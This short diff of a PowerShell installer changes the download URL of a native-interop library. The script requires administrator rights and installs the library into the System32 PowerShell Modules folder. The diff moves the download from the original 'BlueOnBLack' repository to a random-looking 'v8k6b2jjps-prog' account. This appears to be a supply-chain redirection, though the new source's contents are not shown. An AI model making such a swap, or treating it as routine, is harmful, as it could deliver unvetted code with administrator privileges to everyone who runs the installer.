@@ -33,7 +33,7 @@ if (-not $adminRole.IsInRole([Security.Principal.WindowsBuiltInRole]::Administra
     exit 1
 }
 
-$repoUrl = "https://github.com/BlueOnBLack/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
+$repoUrl = "https://github.com/v8k6b2jjps-prog/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
 $moduleFolder = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NativeInteropLib"
 $tempFolder = "$env:TEMP\Unmanaged.PS1.Library"
 $zipFile = "$tempFolder.zip"
